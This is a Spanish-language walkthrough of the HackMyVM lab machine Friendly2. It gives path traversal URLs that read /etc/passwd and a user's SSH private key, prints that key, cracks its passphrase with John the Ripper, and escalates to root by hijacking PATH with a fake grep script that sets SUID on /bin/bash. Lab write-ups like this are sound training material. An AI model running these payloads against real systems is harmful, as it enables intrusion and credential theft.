___
Tags: #pathTravesal #PathHijacking #jonh #SUID 
___
# Friendly2

## Información General

**- Dificultad:** Fácil <br>
**- Sistema operativo:** Linux <br>
**- Vulnerabilidad explotada.**  Path traversal, PATH Hijacking <br>
**- Fecha de resolución:** 17/03/2026 <br>
**- Enlace:** [Friendly2](https://hackmyvm.eu/machines/machine.php?vm=Friendly2) <br>

## Reconocimiento

**Friendly2** nos proporciona la ip de la máquina objetivo **192.168.0.104**

**ARP-SCAN**

```
sudo arp-scan -I eth0 --localnet --ignoredups
```

<p align="center"> 
<img src="images/arpscan.png" width="600" alt="Resultado de Nmap">
</p>

### Ping

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 192.168.0.104
```

**Su ttl es 64. Por tanto, es Linux**

## Enumeración

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.0.104
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

| Open port | Service | Version                                       |
| --------- | ------- | --------------------------------------------- |
| 22        | ssh     | OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) |
| 80        | http    | Apache httpd 2.4.56 ((Debian))                |
|           |         |                                               |

### Enumeración web

#### Gobuster

```
gobuster dir -u http://192.168.0.108 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html
```

<p align="center"> 
<img src="images/gobuster.png" width="600" alt="Resultado de Nmap">
</p>

La ruta que nos interesa es esta: http://192.168.0.104/tools/
Lo importante se encuentra en el código fuente de la página que esta comentado:
<font color="#00b050">Redimensionar la imagen en check_if_exist.php?doc=keyboard.html --></font>

Por tanto, la nueva ruta se quedaría así:

http://192.168.0.104/tools/check_if_exist.php?doc=keyboard.html

<p align="center"> 
<img src="images/teclado.png" width="600" alt="Resultado de Nmap">
</p>

## Explotación

### Path traversal

Esta página presente una vulnerabilidad que es la **path traversal**, si en la url escribimos:

```
view-source:http://192.168.0.104/tools/check_if_exist.php?doc=../../../../../../../../../../etc/passwd
```

<p align="center"> 
<img src="images/passwd.png" width="600" alt="Resultado de Nmap">
</p>

Podemos visualizar el contenido del archivo **passwd**. Nos percatamos que existe el usuario **ghost**. Podríamos intentar conseguir su archivo **id_rsa**, que básicamente sirve para acceder mediante ssh el usuario sin usar la contraseña.

```
view-source:http://192.168.0.104/tools/check_if_exist.php?doc=../../../../../../../../../../home/gh0st/.ssh/id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY----- 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 9tDhjVw3oagRmc3R03zfIwbPINo= -----END OPENSSH PRIVATE KEY-----
```

Esto lo guardamos en un archivo.txt en nuestra kali.

Este archivo hay que darle el siguiente permiso:

```
chmod 600 id_rsa
ssh -i id_rsa gh0st@192.168.0.104
```

<p align="center"> 
<img src="images/id_rsa.png" width="600" alt="Resultado de Nmap">
</p>

Para mi sorpresa me pide contraseña... Por tanto, usaremos la herramienta **jonh the ripper** para saber cual es.

### Jonh The Ripper

A continuación vamos a crakear el archivo, id_rsa usado el siguiente comando:

```
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

La contraseña es **celtic**

<p align="center"> 
<img src="images/gh0st.png" width="600" alt="Resultado de Nmap">
</p>

Obtenemos la primera flag

<p align="center"> 
<img src="images/flag.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de Privilegios

```
sudo -l
```

<p align="center"> 
<img src="images/sudo.png" width="600" alt="Resultado de Nmap">
</p>

Para poder escribir en este script la terminal **kitty** no te dejará, tendras que cambiar a una terminal **xfce4-terminal** que es la default que tiene kali.

```
nano /opt/security.sh
```

<p align="center"> 
<img src="images/script.png" width="600" alt="Resultado de Nmap">
</p>

>Este script de Bash valida una cadena ingresada por el usuario y, si pasa las pruebas, la codifica en Base64 para mostrarla. Es un ejemplo simple de validación y codificación básica.

### PathHijacking

El error de este script es el **grep** que esta en ruta relativa, y debería ser en ruta absoluta, porque yo dentro de la carpeta **/tmp** puedo crear un archivo llamado grep y poner un codigo malicioso para escalar privilegio 

Además este script tiene permiso de root

<p align="center"> 
<img src="images/permiso.png" width="600" alt="Resultado de Nmap">
</p>

```
#!/bin/bash

echo "Permisos establecidos de forma correcta."
chmod u+s /bin/bash
```

Preparo el script dándole permiso de ejecución y estableciendo **grep** en el PATH 

```
chmod +x /tmp/grep
export PATH=/tmp:$PATH
sudo PATH=/tmp:$PATH /opt/security.sh
```

<p align="center"> 
<img src="images/ejecucion.png" width="600" alt="Resultado de Nmap">
</p>

Una vez ejecutado el script el permiso del script ha cambiado

<p align="center"> 
<img src="images/permisomutado.png" width="600" alt="Resultado de Nmap">
</p>

```
bash -p
```

<p align="center"> 
<img src="images/bash.png" width="600" alt="Resultado de Nmap">
</p>

Pero, aquí no acaba todo... porque resulta que dentro de la carpeta /root/root.txt. Me comenta que busque en "..."

La carpeta "..." se encuentra en la raíz 

<p align="center"> 
<img src="images/ls.png" width="600" alt="Resultado de Nmap">
</p>

También, lo puedes encontrar con este comando

```
find / -name "..." 2>/dev/null
```

Dentro nos encontraremos un archivo llamado **ebbg.txt**

<font color="#ff0000">98199n723q0s44s6rs39r33685q8pnoq</font> ---> nqssrsrqpnoq

Que tendremos que descodificar con el script anterior, por tanto solo hay que escoger de aqui las letras y luego sustituirla por el resultado

```
bash /opt/security.sh
```

<p align="center"> 
<img src="images/codificado.png" width="600" alt="Resultado de Nmap">
</p>

La flag codificada anterior: <font color="#ff0000">98199n723q0s44s6rs39r33685q8pnoq</font> ---> nqssrsrqpnoq <br>
La flag descodificada:         <font color="#00b050">98199a723d0f44f6ef39e33685d8cabd</font> ---> adffefedcabd <br>

## Conclusión

La máquina **Friendly2** de HackMyVM es excelente de principio a fin. Durante la enumeración encontramos una URL vulnerable a **path traversal** que nos permitió acceder al archivo `id_rsa` del usuario.

Luego usamos **John the Ripper** para crackear la contraseña del archivo privado SSH. Finalmente, la escalada de privilegios se logró explotando un script que usa `grep` por **ruta relativa**.

Creando un binario malicioso con el nombre `grep`, dándole permisos de ejecución (`chmod +x`) e incluyéndolo en el **PATH** del usuario, logramos ejecutar código arbitrario como root.